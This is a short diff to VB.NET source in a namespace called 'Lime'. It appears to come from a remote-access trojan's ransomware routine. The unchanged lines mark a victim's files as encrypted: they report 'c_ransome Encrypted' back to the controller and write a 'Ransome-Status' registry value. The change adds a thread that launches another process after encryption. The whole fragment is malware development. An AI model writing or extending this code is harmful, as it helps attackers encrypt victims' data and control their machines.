@@ -46,8 +46,9 @@ Namespace Lime
             key = Nothing
             C.Send(("c_ransome" & C.SPL & "Encrypted"))
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encrypted")
-
             SC()
+            Dim T2 As New Threading.Thread(AddressOf MISC.Proc)
+            T2.Start()
             Exit Sub
         End Sub
 
